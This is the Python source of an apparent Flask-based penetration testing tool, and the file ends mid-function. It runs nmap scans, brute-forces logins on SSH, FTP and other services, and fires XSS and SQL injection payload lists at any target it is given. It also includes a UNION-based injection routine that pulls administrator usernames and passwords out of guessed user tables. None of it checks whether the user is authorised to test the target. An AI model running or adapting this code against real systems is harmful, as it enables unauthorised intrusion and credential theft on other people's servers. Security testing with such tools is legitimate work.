# Flask imports
from flask import Flask, request, jsonify, render_template, Response
from flask_cors import CORS

# Networking and scanning tools
import nmap
import paramiko, sys, os, termcolor
import ftplib
import telnetlib
import socket
import subprocess
from vncdotool import api
import requests
from requests.exceptions import SSLError, ConnectionError
import urllib3
from html import escape

# Database connectors
import mysql.connector
import pymssql

# HTML parsing and web scraping
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin

# Miscellaneous utilities
import random
import re
import termcolor
import threading
import time
import queue
import smtplib
from colorama import Fore, Style, init

# Disable SSL warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


app = Flask(__name__, static_folder='FrontEnd/static', template_folder='FrontEnd/templates')
CORS(app)
event_queue = queue.Queue()

proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
init(autoreset=True)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status', methods=['GET'])
def status():
    return "Backend is running"

@app.route('/events', methods=['GET'])
def sse():
    def event_stream():
        while True:
            message = event_queue.get()
            yield f'data: {message}\n\n'
    
    return Response(event_stream(), content_type='text/event-stream')

@app.route('/scan', methods=['POST'])
def handle_scan():
    
    data = request.json
    target = data.get('target')
    test_type = data.get('test_type')
    
    if not target or not test_type:
        return jsonify({'error': 'Por favor ingrese la URL o IP a escanear'}), 400
   
    try:
        hostname = extract_hostname(target)
        
        if is_valid_ip(hostname):
            target_ip = hostname
        elif is_valid_domain(hostname):
            target_ip = socket.gethostbyname(hostname)
        else:
            return jsonify({'error': 'Ingrese una IP o dominio valido'}), 400
    except socket.gaierror as e:
        return jsonify({'error': f'Error resolving target: {e}'}), 400
    
    
    if test_type == 'port_scan':
        scan_result = scan(target_ip)
        response = {
            'scan_result': scan_result,
            'scan_vulnerabilities_found': scan_result['vulnerabilities_found'],
            'open_ports': scan_result['open_ports']
        }
    
    elif test_type == 'brute_force':
        brute_force_result = start_brute_force(target_ip)
        response = {
            'brute_force_result': brute_force_result,
            'brute_force_successful': any(result['status'] == 'success' for result in brute_force_result)
        }
    
    elif test_type in ['sql_injection', 'xss']:
        base_url = target.strip().rstrip('/')
        status_messages = []
        results = []
        
        print("\n[+] Inspecting the different paths for the entered page...")
        urls_to_test = find_urls_to_test(base_url, base_url)
        
        if urls_to_test:
            for url in urls_to_test:
                print(url)
                status_messages.append(f"{url}")
            
            print(f"\n[+] Testing each URL for {test_type} vulnerabilities.")
            
            for test_url in urls_to_test:
                print(f"\n[+] Testing URL: {test_url}")
                if test_type == 'sql_injection':
                    sqli_result = exploit_sqli(test_url)
                    num_col = exploit_sqli_column_number(test_url)
                    admin_found, admin_password = exploit_sqli_users_table(test_url)
                    db_version = exploit_database_version(test_url)
                    
                    if sqli_result:
                        results.append({
                            "url": test_url,
                            "payloads": sqli_result
                        })
                
                    if num_col:
                        print(Fore.GREEN + f"[+] We determined that your database has {num_col} columns at this URL, as the server did not handle exceptions properly during the SQL query.")
                        results.append({
                            "url": test_url,
                            "columns_detected": num_col
                        })
                
                    if admin_found:
                        print(Fore.GREEN + f"[+] Se encontró la contraseña del administrador en {test_url}: {admin_password}.")
                        results.append({
                            "url": test_url,
                            "admin_password_found": True,
                            "admin_password": admin_password
                        })
                
                    if db_version:
                        print(Fore.GREEN + f"[+] Database version found: {db_version} for {test_url}")
                        results.append({
                            "url": test_url,
                            "database_version_found": True,
                            "database_version": db_version
                        })
                    
                    
                elif test_type == 'xss':
                    xss_results = exploit_xss_url(test_url)
                    xss_form_vulnerabilities = submit_xss_payloads_to_forms(test_url)
                    
                    if xss_results:
                        for result in xss_results:
                            if result["vulnerable"]:
                                sanitized_payload = escape(result['payload'])
                                print(Fore.GREEN + f"[+] XSS vulnerability found with payload: {result['payload']}")
                                results.append({
                                    "url": test_url,
                                    "xss_vulnerability_found": True,
                                    "xss_payload": sanitized_payload
                                })
            
                    if xss_form_vulnerabilities:
                        for form_vuln in xss_form_vulnerabilities:
                            sanitized_form_payload = escape(form_vuln["payload"])
                            results.append({
                                "url": test_url,
                                "xss_form_vulnerability_found": True,
                                "xss_form_payload": sanitized_form_payload
                            })
                
            if test_type == 'sql_injection':
                response = {
                    "status_messages": status_messages,
                    "sql_vulnerabilities_found": any('payloads' in result for result in results),
                    "columns_detected_found": any('columns_detected' in result for result in results),
                    "admin_password_found": any('admin_password_found' in result for result in results),
                    "database_version_found": any('database_version_found' in result for result in results),
                    "sql_injection_results": [r for r in results if 'payloads' in r],
                    "column_detection_results": [r for r in results if 'columns_detected' in r],
                    "admin_password_results": [r for r in results if 'admin_password_found' in r],
                    "database_version_results": [r for r in results if 'database_version_found' in r],
                }
                
            elif test_type == 'xss':
                response = {
                    "status_messages": status_messages,
                    "xss_vulnerabilities_found": any('xss_vulnerability_found' in result for result in results),
                    "xss_form_vulnerabilities_found": any('xss_form_vulnerability_found' in result for result in results),
                    "xss_results": [r for r in results if 'xss_vulnerability_found' in r],
                    "xss_form_results": [r for r in results if 'xss_form_vulnerability_found' in r]
                }
        else:
            response = {"error": "No URLs with parameters found."}
    else:
        return jsonify({'error': 'Invalid test type'}), 400
    
    return jsonify(response)

xss_payloads = [
    "<script>alert('Hacked')</script>",
    """><svg/onload=prompt(1)>"",
    "<svg/onload=prompt(1)",
    "<script>prompt.call`${1}`</script>",
    "--!><svg/onload=prompt(1)",
    "//prompt.ml%2f@⒕₨",
    "vbscript:prompt(1)#{"action":1}",
    """"><img src=1 onerror=alert(1)>""",
    "p'rompt(1)",
    "<svg><script>prompt&#40;1)</script>",
    '"><script>alert(document.domain)</script>',
    '" autofocus onfocus="alert(document.domain)',
    "javascript:alert('XSS')",
    "';alert('Hacked');//",
    "'--><svg onload=alert()>",
    " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//",
    """ 1/*' or 1 or'" or 1 or"*//*" """,
    """“ onclick=alert(1)//<button value=Click_Me ‘ onclick=alert(1)//> */ alert(1); /*""",
    """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
    """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
    "<img src=x onerror=alert('Hacked')>",
    "<svg/onload=alert('Hacked')>",
    "'<script>alert('Hacked')</script>'",
    "\"<script>alert('Hacked')</script>\""
]

    
def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None and all(0 <= int(octet) <= 255 for octet in ip.split('.'))

def is_valid_domain(domain):
    domain_pattern = re.compile(
        r"^(?:(?:https?|ftp):\/\/)?(?:[\w-]+\.)+[a-zA-Z]{2,7}$"
    )
    return domain_pattern.match(domain) is not None

def extract_hostname(url):
    if url.startswith(('http://', 'https://')):
        return url.split('://', 1)[1].split('/', 1)[0]
    return url

def get_response(url, retries=3):
    for i in range(retries):
        try:
            r = requests.get(url, verify=False, proxies=proxies, timeout=10)
            if r.status_code == 200:
                return r
            elif r.status_code == 403:
                print(f"[+] The website is secure: access to this URL was blocked with a 403 (Forbidden) code.")
                return None
        except (requests.RequestException, SSLError, ConnectionError) as e:
            print(f"Error fetching {url}: {str(e)}")
            time.sleep(random.uniform(1, 3))
    return None

def is_ip_address(url):
    ip_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
    return ip_pattern.match(url) is not None

def find_urls_to_test(url, base_url):
    if is_ip_address(url):
        url = f"http://{url}"
    
    if is_ip_address(base_url):
        base_url = f"http://{base_url}"
        
    response = get_response(url)
    if not response:
        return set()
    
    if hasattr(response, 'text'):
        html_content = response.text
    else:
        html_content = response

    soup = BeautifulSoup(html_content, 'html.parser')
    base_url = base_url.rstrip('/')
    parsed_base_url = urlparse(base_url)
    links = set()

    for a_tag in soup.find_all('a', href=True):
        href = a_tag['href']
        parsed_href = urlparse(href)
        if parsed_href.netloc and parsed_href.netloc != parsed_base_url.netloc:
            continue
        
        if href.startswith('/'):
            full_url = base_url + href
        elif href.startswith('http'):
            full_url = href
        else:
            full_url = f"{base_url}/{href}"
            
        if "Id" not in href:
            links.add(full_url)
            if "?" in href:
                links.add(full_url)
    
    if not links:
        scripts = soup.find_all('script')
        for script in scripts:
            if "?" in script.text:
                links.add(script.text)

    return links

def submit_xss_payloads_to_forms(url):
    """
    Submits XSS payloads to forms and containers on the target URL to detect XSS vulnerabilities.

    Args:
        url (str): The target URL where forms and containers will be analyzed and tested for XSS vulnerabilities.

    Returns:
        bool: Returns True if a vulnerability is found, False otherwise.

    Description:
        - Retrieves the page content for the specified URL using the `get_response` function.
        - Extracts all forms and containers with input elements from the HTML using the `get_forms_and_inputs` function.
        - If no forms or input containers are found, it prints a message and returns False.
        - Iterates over all forms, prepares form data by injecting random XSS payloads into input fields, and submits the form.
        - Depending on the form method (`POST` or `GET`), it sends the request and checks if the payload is reflected in the response.
        - Repeats the process for containers with input elements (e.g., `<div>`, `<section>`).
        - If an XSS vulnerability is found, it prints the payload and returns True.
        - If no vulnerability is found after all forms and containers are tested, it returns False.
    """
    response = get_response(url)
    if not response:
        return False

    forms_and_inputs = get_forms_and_inputs(response)
    forms = forms_and_inputs.get('forms', [])
    containers_with_inputs = forms_and_inputs.get('containers_with_inputs', [])
    
    if not forms and not containers_with_inputs:
        print("[-] No forms or inputs found on the page.")
        return False
    
    results = []

    #print(f"Forms found: {len(forms)}")
    #print(f"Containers with inputs found: {len(containers_with_inputs)}")

    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        form_url = urljoin(url, action)

        inputs = form.find_all('input')
        form_data = {}
        for input_tag in inputs:
            input_name = input_tag.get('name')
            if input_name:
                form_data[input_name] = random.choice(xss_payloads)
        
        for payload in xss_payloads:
            if method == 'post':
                r = requests.post(form_url, data=form_data, verify=False, proxies=proxies)
            else:
                r = requests.get(form_url, params=form_data, verify=False, proxies=proxies)

            if payload in r.text:
                print(Fore.GREEN + f"[+] XSS vulnerability found in form with payload: {payload}" + Style.RESET_ALL)
                results.append({"form_action": action, "payload": payload})

    for container in containers_with_inputs:
        inputs = container.find_all(['input', 'textarea', 'button'])
        if not inputs:
            continue

        form_data = {}
        for i, input_tag in enumerate(inputs):
            input_name = input_tag.get('name') or f'temp_name_{i}'
            form_data[input_name] = random.choice(xss_payloads)

        #print(f"Prepared form data for container: {form_data}")

        for payload in xss_payloads:
            r = requests.get(url, params=form_data, verify=False, proxies=proxies)
            if payload in r.text:
                print(Fore.GREEN + f"[+] XSS vulnerability found in container with payload: {payload}")
                results.append({"container": "input_container", "payload": payload})

    if not results:
        print("[-] No XSS vulnerabilities found in forms or containers.")
        
    return results


def get_forms_and_inputs(response, max_attempts=3):
    """
    Extracts forms and containers with input elements from the HTML response.

    Args:
        response (requests.Response): The HTTP response object containing the page content to be analyzed.
        max_attempts (int, optional): The maximum number of attempts to retrieve forms and input elements 
                                      if they are not found on the first try. Defaults to 3.

    Returns:
        dict: A dictionary with two keys:
              - 'forms': A list of form elements found in the HTML.
              - 'containers_with_inputs': A list of containers (div, section, article) that include input elements.

    Description:
        - Parses the HTML content from the provided response using BeautifulSoup.
        - Searches for all `<form>` elements in the HTML.
        - Additionally looks for containers (e.g., <div>, <section>, <article>) that have any `<input>`, 
          `<textarea>`, or `<button>` elements within them.
        - If no forms or containers with inputs are found, it retries the process up to `max_attempts` times, 
          with a 1-second delay between each attempt.
        - Returns a dictionary containing the list of forms and containers with input elements.
    """
    soup = BeautifulSoup(response.text, 'html.parser')

    forms = soup.find_all('form')

    containers_with_inputs = []
    containers = soup.find_all(['div', 'section', 'article'])
    for container in containers:
        if container.find_all(['input', 'textarea', 'button']):
            containers_with_inputs.append(container)

    attempt = 1
    while not forms and not containers_with_inputs and attempt <= max_attempts:
        time.sleep(1)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        containers_with_inputs = []
        containers = soup.find_all(['div', 'section', 'article'])
        for container in containers:
            if container.find_all(['input', 'textarea', 'button']):
                containers_with_inputs.append(container)
        attempt += 1

    result = {
        'forms': forms,
        'containers_with_inputs': containers_with_inputs
    }
    return result

def exploit_xss_url(url):
    """
    Attempts to exploit a possible XSS vulnerability by injecting common XSS payloads into the URL.

    Args:
        url (str): The target URL where XSS payloads will be injected and tested.

    Returns:
        bool: Returns True if a vulnerability is found, False otherwise.

    Description:
        - Iterates over a predefined list of XSS payloads, injecting each one as a query parameter in the URL.
        - Sends a GET request to the modified URL.
        - Checks if the payload appears in the page content, which indicates a potential XSS vulnerability.
        - Analyzes the HTML response for specific indicators of vulnerability, such as reflected error messages, 
          JavaScript events like `alert`, `onerror`, or `onload`.
        - If a vulnerability is found, it prints the payload and returns True.
        - If an SSL error or request-related error occurs during the process, it handles the exception and prints an error message.
        - If no vulnerability is found after all payloads are tested, it returns False.
    """
    results = []
    
    for payload in xss_payloads:
        target_url = f"{url}?input={payload}"
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            
            if payload in r.text:
                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}")
                results.append({"payload": payload, "vulnerable": True})
                continue

            soup = BeautifulSoup(r.text, 'html.parser')
            title = soup.title.string if soup.title else ""
            if "error" in title.lower():
                print(Fore.GREEN + f"[+] XSS vulnerability found in error message with payload: {payload}"+ Style.RESET_ALL)
                results.append({"payload": payload, "vulnerable": True})
                continue

            error_message = soup.find('div', class_='message') or soup.find('div', class_='error')
            if error_message and payload in error_message.text:
                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
                results.append({"payload": payload, "vulnerable": True})
                continue

            if any(keyword in r.text.lower() for keyword in ['alert', 'onerror', 'onload']):
                print(Fore.GREEN + f"[+] XSS vulnerability found in URL with payload: {payload}"+ Style.RESET_ALL)
                results.append({"payload": payload, "vulnerable": True})
                continue

        except SSLError as e:
            print(f"[-] SSL Error on {target_url}: {e}")
        except requests.RequestException as e:
            print(f"[-] Request error on {target_url}: {e}")

    if results:
        return results
    else:
        print("[-] No XSS vulnerabilities found in URL.")
        return [{"payload": None, "vulnerable": False}]

def exploit_database_version(url):
    """
    Attempts to detect the database type and version through SQL injection payloads.

    Args:
        url (str): The target URL where the SQL injection payloads will be tested.

    Returns:
        None: Prints the detected database type and version if found, or appropriate error messages.

    Description:
        - Defines a set of SQL injection payloads for various database types, including Oracle, MySQL, PostgreSQL, 
          Microsoft SQL Server, SQLite, DB2, and Sybase.
        - Iterates through each database type and its associated payloads.
        - Sends a request with the SQL payload appended to the target URL.
        - Analyzes the server's response to detect specific database-related keywords or error messages.
        - If a potential database version is found, it parses the response and prints the database type and version.
        - Handles HTTP status codes, specifically 403 (Forbidden) and 500 (Internal Server Error), and continues
          testing payloads if no success is achieved with the initial payload.
        - In case of an HTTP error or if no matching database type is detected after all payloads are exhausted, 
          an appropriate message is printed.
        - Includes exception handling for request-related errors to ensure the function doesn't crash on failure.
    """
    database_types = {
        'Oracle': [
            "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
            "' AND 1=2 UNION SELECT NULL, version FROM v$instance--"
        ],
        'MySQL': [
            " UNION SELECT @@version, NULL%23",
            "' AND 1=2 UNION SELECT version(), NULL--"
        ],
        'PostgreSQL': [
            "' UNION SELECT version(), NULL--",
            "' AND 1=2 UNION SELECT version(), current_user--"
        ],
        'Microsoft SQL Server': [
            "' UNION SELECT @@version, NULL--",
            "' AND 1=2 UNION SELECT version(), NULL--"
        ],
        'SQLite': [
            "' UNION SELECT sqlite_version(), NULL--",
            "' AND 1=2 UNION SELECT sqlite_version(), NULL--"
        ],
        'DB2': [
            "' AND 1=2 UNION SELECT NULL, service_level FROM sysibm.sysversions--",
            "' AND 1=2 UNION SELECT version(), NULL FROM sysibm.sysversions--"
        ],
        'Sybase': [
            "' UNION SELECT @@version, NULL--",
            "' AND 1=2 UNION SELECT version(), current_user--"
        ]
    }

    try:
        for db_type, payloads in database_types.items():
            #print(f"[*] Attempting to detect {db_type} database...")
            
            for payload in payloads:
                try:
                    response = requests.get(f"{url}{payload}")
                    response.raise_for_status()
                except requests.exceptions.HTTPError as e:
                    status_code = e.response.status_code

                    if status_code == 403:
                        print(f"[+] The website is secure: access to this URL was blocked with a 403 (Forbidden) code.")
                        continue
                    elif status_code == 500:
                        print(Fore.GREEN + f"[+] Potential vulnerability found with payload: {payload}")
                        continue
                    else:
                        #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
                        continue

                if re.search(db_type, response.text, re.IGNORECASE):
                    soup = BeautifulSoup(response.text, 'html.parser')

                    if db_type == 'Oracle':
                        version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
                        if version_oracle:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
                            return f"{db_type} version: {version_oracle.strip()}"
                            
                    elif db_type in ['MySQL', 'Microsoft SQL Server', 'Sybase']:
                        version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
                        if version_generic:
                            version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
                            if version_number:
                                print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
                                return f"{db_type} version: {version_number.group(0)}"
                            
                    elif db_type == 'PostgreSQL':
                        version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
                        if version_postgres:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
                            return f"{db_type} version: {version_postgres.strip()}"

                    elif db_type == 'SQLite':
                        version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
                        if version_sqlite:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
                            return f"{db_type} version: {version_sqlite.strip()}"
                        
                    elif db_type == 'DB2':
                        version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
                        if version_db2:
                            print(Fore.GREEN + f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
                            return f"{db_type} version: {version_db2.strip()}"

                    print(Fore.GREEN + f"[+] Found the database: {db_type} | [-] Could not extract the version.")
            
                else:
                    #print(f"[-] No match found for {db_type} using current payload.")
                    return None

        print("[-] Could not detect the database type after exhausting all payloads.")
    
    except requests.exceptions.RequestException as e:
        print(f"[-] An error occurred while trying to detect the database version: {e}")
        return None
        
        
def exploit_sqli_users_table(url):
    """
    Performs SQL injection to attempt to retrieve the administrator's password from the users table.

    Args:
        url (str): The URL to target for SQL injection.

    Returns:
        bool: True if the administrator's password is found, False otherwise.

    Description:
        - Constructs a SQL injection payload to extract the 'username' and 'password' from the 'users' table.
        - Sends a request with the SQL payload appended to the URL.
        - If the response is in HTML format, it parses the content for common usernames.
        - If a username is found, it retrieves the associated password and prints it.
        - Returns True if the password is successfully found, otherwise returns False.
        - Handles SSL errors and other request-related exceptions.
    """
    
    common_usernames = ['administrator', 'admin', 'root', 'superuser', 'sysadmin','user']
    possible_tables = ['users', 'usuarios', 'user_accounts', 'login', 'members']

    def try_payload(sql_payload):
        """
        Internal helper function to test a SQL payload across all possible tables.
        Returns True if a password is found, otherwise False.
        """

        for table in possible_tables:
            payload_to_try = sql_payload.format(table=table)
            #print(f"[DEBUG] Trying payload: {payload_to_try}")
            try:
                r = requests.get(url + payload_to_try, verify=False, proxies=proxies, timeout=10)
            except SSLError as e:
                print(f"[-] SSL Error en {url}: {e}")
                continue

            if "text/html" in r.headers.get("Content-Type", ""):
                soup = BeautifulSoup(r.text, 'html.parser')
            else:
                #print(f"[-] La respuesta no es de tipo HTML con el payload: {payload_to_try}")
                continue

            if not soup.body:
                #print(f"[-] No se encontró un cuerpo HTML válido con el payload: {payload_to_try}")
                continue

            for username in common_usernames:
                user_element = soup.body.find(string=username)
                if user_element:
                    parent = user_element.parent
                    password_element = parent.findNext('td') if parent else None

                    if password_element and password_element.contents:
                        admin_password = password_element.contents[0]
                        print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                        return True, admin_password
                    
            admin_element = soup.find(string=re.compile(r'.*administrator.*'))
            if admin_element:
                try:
                    admin_password = admin_element.split('*')[1]
                    print(Fore.GREEN + f"[+] Found Password for '{username}': '{admin_password}' in table '{table}'")
                    return True, admin_password
                except IndexError:
                    print(f"[-] Failed to correctly extract the administrator password from the payload '{payload_to_try}'")

            #print(f"[-] No se encontraron usuarios comunes en la tabla '{table}' con el payload '{payload_to_try}'")

        return False, None
    
    first_payload = "' UNION select username, password from {table}--"
    found, admin_password = try_payload(first_payload)
    if found:
        return True, admin_password
    
    
    second_payload = "' UNION select NULL, username || '*' || password from {table}--"
    found, admin_password = try_payload(second_payload)
    if found:
        return True, admin_password

    print(f"[-] Failed to retrieve the administrator credentials.")
    return False, None
    
def exploit_sqli(url):
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        '" OR "1"="1"',
        '" OR "1"="1" --',
        "' OR 'a'='a",
        "' OR 'a'='a' --",
        "1 OR 1=1",
        "admin' --",
        "administrator' --",
        "' UNION SELECT NULL, NULL --",
        "[Nothing]", 
        " ' or sleep(1) or '",
        ' " or sleep(1) or " ',
        " sleep(3)",
        """ sleep(3)/*' or sleep(3) or '" or sleep(3) or"*/""", 
        "/*‘ or ‘’=‘“ or “”=“*/",
        """/*!SLEEP(1)*/ /*/alert(1)/*/*/""",
        """/*! SLEEP(1) */ /*/ onclick=alert(1)//<button value=Click_Me /**/ or /*! or SLEEP(1) or */ /*/, onclick=alert(1)//> /**/ or /*! or SLEEP(1) or */, onclick=alert(1)// /**/ /**/ /**/""",
        "'",
        '"',
        "`",
        "')",
        '")',
        '`)',
        "'))",
        '"))',
        "`))",
        "(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))"
    ]

    vulnerable_payloads = []
    for payload in payloads:
        target_url = url + payload
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if 500 <= r.status_code < 600:
                vulnerable_payloads.append((payload))
                print(f"[+] URL vulnerable detectada: {target_url} con el payload: {payload}")
                
        except SSLError:
            return False
        except requests.RequestException:
            return False

    return vulnerable_payloads

def exploit_sqli_column_number(url):
    """
    Attempts to detect the number of columns in the database using SQL injection.

    Args:
        url (str): The target URL for testing column numbers in SQL injection.

    Returns:
        int or bool: The number of columns if detected, or False in case of an error.

    Description:
        - Iterates through a range of column numbers (1 to 4) and appends the SQL 'ORDER BY' clause to the target URL.
        - Sends an HTTP request to test the response for each column count.
        - If an "Internal Server Error" is encountered, the number of columns is considered to be one less than the current iteration.
        - Handles SSL and request-related exceptions.
        - Returns the number of columns or False if an error occurs or if no column number is determined.
    """
    for i in range(1, 10):
        target_url = url + "'+order+by+%s--" % i
        try:
            r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
            if "Internal Server Error" in r.text:
                return i - 1 
        except SSLError as e:
            print(f"[-] SSL Error en {target_url}: {e}")
            return False
        except requests.RequestException as e:
            print(f"[-] Request error en {target_url}: {e}")
            return False
    return False

API_KEY = os.getenv("API_KEY")

def is_vulnerable(product, version):
    api_url = "https://vulners.com/api/v3/search/lucene/"
    headers = {
        'Content-Type': 'application/json',
        'X-Vulners-ApiKey': API_KEY
    }
    query = f"{product} {version}"
    data = {
        "query": query,
        "size": 1
    }

    try:
        response = requests.post(api_url, headers=headers, json=data)
        response.raise_for_status()
        data = response.json()
        if data.get('data', {}).get('total', 0) > 0:
            vuln_data = data['data']['search'][0]
            title = vuln_data.get('title', 'No disponible')
            cvss_score = vuln_data.get('cvss', {}).get('score', 'No disponible')
            description = vuln_data.get('description', 'No disponible')
            references = vuln_data.get('href', 'No disponible')
            return True, {
                'title': title,
                'cvss_score': cvss_score,
                'description': description,
                'references': references
            }
        else:
            return False, {}
    except requests.exceptions.RequestException as e:
        print(f"Failed to query the Vulners API: {e}. There might be an issue with the request or the system's connectivity.")
        return False, {}
    except ValueError as e:
        print(f"Error decoding JSON response: {e}. The data received may be incomplete or malformed.")
        return False, {}

def scan(target):
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=target, arguments='-p 20,21,22,23,25,53,80,110,123,143,179,443,465,500,587,993,995,1433,2222,3306,3389,41648,5900 -sV -sC')
    except nmap.PortScannerError as e:
        print(f"Failed to execute Nmap: {e}. The system might be protected or unreachable.")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'Error al ejecutar nmap.'}
    except Exception as e:
        print(f"Unexpected error: {e}")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'Error inesperado durante el escaneo.'}

    print(nm.csv())

    scan_results = []
    vulnerabilities_found = False
    filtered_ports = 0
    open_ports = 0

    if not nm.all_hosts():
        print(f"No hosts found in {target}")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'No se encontraron hosts en el objetivo.'}

    for host in nm.all_hosts():
        host_results = {
            'host': host,
            'protocols': []
        }
        for proto in nm[host].all_protocols():
            protocol_results = {
                'protocol': proto,
                'ports': []
            }
            ports = nm[host][proto].keys()
            for port in ports:
                state = nm[host][proto][port]['state']
                
                if state == 'filtered':
                    filtered_ports += 1
                if state == 'open':
                    open_ports += 1
                    
                product = nm[host][proto][port].get('product', '')
                version = nm[host][proto][port].get('version', '')
                port_result = {
                    'port': port,
                    'state': state,
                    'product': product,
                    'version': version,
                    'vulnerable': False,
                    'vul_data': {}
                }
                if product and version:
                    is_vuln, vul_data = is_vulnerable(product, version)
                    if is_vuln:
                        vulnerabilities_found = True
                        port_result['vulnerable'] = True
                        port_result['vul_data'] = vul_data
                protocol_results['ports'].append(port_result)
            host_results['protocols'].append(protocol_results)
        scan_results.append(host_results)

    return {
        'vulnerabilities_found': vulnerabilities_found,
        'results': scan_results,
        'filtered_ports': filtered_ports,
        'open_ports': open_ports
    }

def start_brute_force(target):
    max_threads = 10
    thread_limiter = threading.BoundedSemaphore(max_threads)
    brute_force_results = []

    max_failed_attempts_per_service = {
        'SSH': 10,
        'FTP': 10,
        'Telnet': 10,
        'RDP': 10,
        'VNC': 10,
        'MySQL': 10,
        'MSSQL': 10,
        'SMTP': 10
    }

    failed_attempts_per_service = {service: 0 for service in max_failed_attempts_per_service}
    stop_flag_per_service = {service: False for service in max_failed_attempts_per_service}
    
    ports_to_test = {
        'SSH': 22,
        'FTP': 21,
        'Telnet': 23,
        'RDP': 3389,
        'VNC': 5900,
        'MySQL': 3306,
        'MSSQL': 1433,
        'SMTP': 25
    }

    def service_connect(service_name, username, password, port, max_attempts=10):
        nonlocal brute_force_results
        result = None

        if stop_flag_per_service[service_name] or failed_attempts_per_service[service_name] >= max_failed_attempts_per_service[service_name]:
            return  

        try:
            if service_name == 'SSH':
                ssh_attempts = 0
                while ssh_attempts < max_attempts and not stop_flag_per_service[service_name]:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(target, port=port, username=username, password=password)
                        print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                        stop_flag_per_service[service_name] = True
                        ssh.close()
                        break
                    except paramiko.AuthenticationException:
                        print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
                        failed_attempts_per_service[service_name] += 1
                        ssh_attempts += 1
                        time.sleep(1)  
                    except socket.timeout:
                        # Manejo específico para tiempo de espera agotado en la conexión
                        failed_attempts_per_service[service_name] += 1
                        ssh_attempts += 1
                        print(termcolor.colored(f"[-] SSH Connection Timed Out for {username}:{password} on {service_name}", 'red'))
                        time.sleep(2)
                        if ssh_attempts >= max_attempts:
                            stop_flag_per_service[service_name] = True
                            break 
                    except Exception as e:
                        print(termcolor.colored(f"[-] SSH Connection Failed: {e}", 'red'))
                        failed_attempts_per_service[service_name] += 1
                        ssh_attempts += 1
                        time.sleep(2)
                        if ssh_attempts >= max_attempts:
                            print(termcolor.colored(f"[-] Max password attempts reached for SSH on {target}:{port}", 'red'))
                            stop_flag_per_service[service_name] = True
                            break

                if ssh_attempts >= max_attempts:
                    print(termcolor.colored(f"[-] Max password attempts reached for SSH on {target}:{port}", 'red'))
                    stop_flag_per_service[service_name] = True
                    
            elif service_name == 'FTP':
                ftp_attempts = 0
                while ftp_attempts < max_attempts and not stop_flag_per_service[service_name]:
                    try:
                        with ftplib.FTP() as ftp:
                            ftp.connect(target, port, timeout=10)
                            ftp.login(user=username, passwd=password)
                            print(termcolor.colored(f"[+] Found Password: {password}, For User: {username} on {service_name}", 'green'))
                            result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'success'}
                            stop_flag_per_service[service_name] = True
                            ftp.quit()
                            break
                    except ftplib.error_perm:
                        print(termcolor.colored(f"[-] Incorrect Password: {password}, For User: {username} on {service_name}", 'red'))
                        result = {'service': service_name, 'port': port, 'username': username, 'password': password, 'status': 'failure'}
                        failed_attempts_per_service[service_name] += 1
                        ftp_attempts += 1
                    
                    except socket.timeout:
                        print(termcolor.colored(f"[-] FTP Connection Timed Out for {username}:{password} on {service_name}", 'red'))
                        failed_attempts_per_service[service_name] += 1
                        ftp_attempts += 1
                        time.sleep(2)
                        if ftp_attempts >= max_attempts:
                            print(termcolor.colored(f"[-] Max password attempts reached for FTP on {target}:{port}", 'red'))
                            stop_flag_per_service[service_name] = True
                            break
                        
                    except Exception as e:
                        print(termcolor.colored(f"[-] FTP Connection Failed: {e}", 'red'))
